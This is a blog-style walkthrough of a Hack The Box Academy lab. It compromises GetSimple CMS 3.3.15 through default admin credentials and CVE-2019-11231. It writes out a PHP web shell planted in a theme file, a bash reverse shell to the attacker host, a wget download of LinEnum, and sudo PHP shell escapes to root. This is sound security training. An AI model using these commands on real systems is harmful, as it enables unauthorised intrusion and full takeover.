---
title: "HTB Academy: Getting Started"
date: 2026-07-01
draft: false
---
> [!NOTE]
> The IPs shown may vary throughout as I write this blog across multiple sessions
> 
> `LHOST` : Local Host (Attacker Machine)
> 
> `RHOST`: Remote Host (Target Machine)
# Overview

This is box was part of HTB's Getting Started Module from the HTB CPTS Learning path.

This involved exploiting a known authenticated Remote Code Execution vulnerability in GetSimple CMS v3.3.15 [CVE-2019-11231](https://nvd.nist.gov/vuln/detail/CVE-2019-11231).

Initial Enumeration revealed a web application admin panel with default credentials. 

This provided access to a theme editor which permitted arbitrary PHP code execution.

Privilege escalation was achieved through a misconfigured sudo permission on `/usr/bin/php` which allowed a shell escape to user and root accounts.
# Attack Chain Summary
1. **Information Gathering**: Nmap and directory enumeration identified SSH, Apache 2.4.41, and exposed web paths, leading to fingerprinting of `GetSimple CMS v3.3.15`.
2. **Pre-Exploitation**: - The admin panel was located and accessed using default credentials (`admin:admin`).
3. **Exploitation**: The theme editor's insufficient input sanitisation via vulnerable version (CVE-2019-11231) was leveraged to upload a PHP web shell via `template.php`, achieving RCE.
4. **Post-Exploitation**: RCE granted a reverse shell as `www-data`, followed by LinEnum enumeration to identify local privilege escalation vectors.
5. **Privilege Escalation**: A permissive sudo rule on `/usr/bin/php` enabled a shell escape to user `mrb3n`, and `root`.

![[GettingStartedChain.png]]

# Walkthrough

## Target Enumeration

Start off with `nmap` scan:
```shell
sudo nmap -sV -sC --reason -oA standardscan $RHOST 
```
![[Pasted image 20260628215443.png]]*Nmap scan revealing SSH on port 22 and HTTP on port 80 running Apache 2.4.41*
## Web Enumeration

Perform further enumeration into the discovered web server on port 80 - running `gobuster` to enumerate web directories:

```shell
gobuster dir -u http://$RHOST/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```
![[Pasted image 20260628220710.png]]
*Output of web directory enumeration to reveal hidden paths*

The `gobuster` scan revealed some interesting web directories that can be explored further:
- `/admin` 
- `/backups`
- `/data`
- `/plugins`
- `/robots.txt`
- `/theme`

Run `whatweb` to identify any interesting web applications in use:
![[Pasted image 20260629081847.png]]
*Output of whatweb verifying Apache 2.4.41*

A lookup using `searchsploit` didn't find any specific vulnerability on `Apache 2.4.41`:
```shell
searchsploit apache 2.4.41   
```
![[Pasted image 20260629082551.png]]
*Vulnerabilities found for Apache from searchsploit*

## Manual Web Enumeration

Exploring the target web page at `http://gettingstarted.htb/`, revealing information that the web application is using `GetSimple CMS`.
![[Pasted image 20260629111518.png]]
*Target homepage showing GetSimple CMS*

Navigating to the directories found from `gobuster` 
### /robots.txt
Navigating to `/robots.txt` confirmed earlier finding of `/admin` from `nmap` and `gobuster`
```html
User-agent: *
Disallow: /admin/
```
### /admin

Navigating to `/admin` is greeted with a simple login page
![[Pasted image 20260629112808.png]]
*Login page found at /admin*
### /backups

Navigating through the `/backups` directory did not find any notable items.
### /data

Within the `/data` directory, two points of interest are identified:

**`/data/cache`**

A text file that reveals the current version of `3.3.15`, this value likely refers to the `GetSimple CMS` version.
![[Pasted image 20260629120222.png]]
![[Pasted image 20260629120059.png]]
*Content of text file in /data/cache revealing outdated application version*
**`/data/users`**

This directory revealed an `admin.xml`. With content revealing a potential username `admin`:
![[Pasted image 20260629131634.png]]
*admin.xml found in /data/users*
![[Pasted image 20260629131849.png]]
*Content of admin.xml revealing username admin*

### /plugins

This directory contained some `.php` plugins:
![[Pasted image 20260629133424.png]]
*Content of /plugins containing folders and .php files*
### /theme

This directory had two folders that also had some `.php` files:
![[Pasted image 20260629132329.png]]
![[Pasted image 20260629132428.png]]
*Contents of /theme containing .php files*
## Admin Page

Having identified a username of `admin` from `/data/users`. 
>[!warning] The admin panel was accessible using default credentials `admin:admin`. 


The admin page shows administrative functions available along with the disclosure of `GetSimple CMS v3.3.15`:
![[Pasted image 20260629153610.png]]
*Admin page showing administrative functions and version of GetSimple CMS*

> [!danger] Research into `GetSimple CMS v3.3.15` revealed a Remote Code Execution (RCE) vulnerability. This vulnerability stems from insufficient input sanitation in the `theme-edit.php`, which allows arbitrary file upload via the theme editor.
> [CVE-2019-11231](https://nvd.nist.gov/vuln/detail/CVE-2019-11231)

### Update Theme template.php

Within the admin panel under `Theme` you are able to `Edit Theme`, with this you have the ability to edit `/theme/Innovation/template.php`:
![[Pasted image 20260629155000.png]]
*Theme editor under the admin panel*
### Upload Web Shell

Update `template.php` with a standard `cmd` command and save changes.
```php
<?php system($_REQUEST["cmd"]); ?>
```

Execute command using `curl`, passing `id` variable to confirm response 
```shell
curl http://gettingstarted.htb/theme/Innovation/template.php?cmd=id   
```
Resulting in a successful command execution, confirming we have RCE:

![[Pasted image 20260629155721.png]]
*Output of curl confirming RCE with output from 'id'*

Update the `template.php` with a reverse shell
```php
<?php system('bash -c "bash -i >& /dev/tcp/$LHOST/1234 0>&1"'); ?>
```
## Reverse Shell

Run listener on `LHOST`:
```shell
nc -lvnp 1234
```
Execute reverse shell by using `curl` to request the `template.php`, gaining shell access with the user `www-data`:
```shell
curl http://gettingstarted.htb/theme/Innovation/template.php
```
![[Pasted image 20260630075356.png]]
*Successful connection to shell, showcasing user www-data*
## Privilege Escalation 

### Linux Enumeration

Transfer Linux Enumeration Script `LinEnum` to the `RHOST`

Start a python http server on `LHOST`:
```shell
sudo python3 -m http.server 8000
```
`wget` from `RHOST` to download file from `LHOST` through the python http server:
```shell
wget http://$LHOST:8000/LinEnum.sh
```

On `RHOST`, change `LinEnum.sh` into executable and run the script, piping output into `linenum.txt` to analyse
```shell
chmod +x LinEnum.sh
```
```shell
./LinEnum.sh 2>&1 | tee linenum.txt
```

Grep findings, signified by regex `"\[+\]"` and showing 3 lines below. 
```shell
grep -A 3 "\[+\]" linenum.txt         # All findings
```
This identified a possible sudo pwnage at `/usr/bin/php`
![[Pasted image 20260630081607.png]]
*Grep output from linenum.txt on main findings, identifying a possible sudo pwnage through /usr/bin/php*

Confirm sudo privilege with `sudo -l`


![[Pasted image 20260630082001.png]]
*Output revealing permissive sudo permissions for /usr/bin/php, allowing users to sudo as any other user with their privileges*

Next is to find a list of users, this can be identified through `/etc/passwd` file:
```shell
cat /etc/passwd | grep -v "nologin\|false"
```
Users `root`, `sync`, and `mrb3n` are identified:
![[Pasted image 20260630083319.png]]
*Users identified from /etc/passwd*

Using the permissive sudo privileges for `/usr/bin/php`, a PHP shell escape can be performed, resources for shell escape was gathered from [GTFObins](https://gtfobins.org/gtfobins/php/#shell). This allowed us to gain shell of user `mrb3n` and retrieve our `user.txt` flag.
```shell
sudo -u mrb3n /usr/bin/php -r 'system("/bin/sh -i");'
```
![[Pasted image 20260630084535.png]]
*PHP escape running sudo as mrb3n granted shell into user account*

Since sudo permissions are permitted `(ALL : ALL)`, we can run the same command as `root` to gain their shell and find the `root.txt` flag
```shell
sudo -u root /usr/bin/php -r 'system("/bin/sh -i");'
```
![[Pasted image 20260630084749.png]]
*PHP escape running sudo as root granted shell into root account*


# Issues & How I Solved Them

## 1. Admin Page

Having identified the `admin` username from `/data/users`, I next needed to find the password to this user. From the the HTB module there was a small section that taught me about a tool that would create a custom word list `CeWL` that I would be able to use for my brute forcing.

Solution:

I had been focused on trying to get that wordlist to work without trying the first obvious passwords from a normal known passwords list. 

With that the login was simply `admin:admin`

## 2. Unable to Reverse Shell

After I had confirmed that the `template.php` was able to execute my `cmd` commands, I had updated the file with a reverse shell:
```php
<?php system(bash -c 'bash -i >& /dev/tcp/$LHOST/1234 0>&1'); ?>
```
However, trying to `curl` the `template.php` yield no outcome.

Solution:

I reverted back to using the `$_REQUEST["cmd"]` and added the reverse shell command to the GET query.

Having done further research into what went wrong, I discovered that I had not submitted proper syntax for `template.php`, needing to wrap the command in quotes.

Correct syntax:
```php
<?php system('bash -c "bash -i >& /dev/tcp/$LHOST/1234 0>&1"'); ?>
```
## 3. Unable to Privilege Escalate to Root
 
After I had ran php shell escape and gained access to user `mrb3n` I had ran another `LinEnum` script on `mrb3n`'s user looking to gain further escalation. 

Solution:

Again I had been trying to get ahead of myself in looking at the deep end without trying the easiest and most obvious first. Having not realised that the sudo permissions had allowed the same php executable to also run as user `root` with `(ALL : ALL)` permissions.  

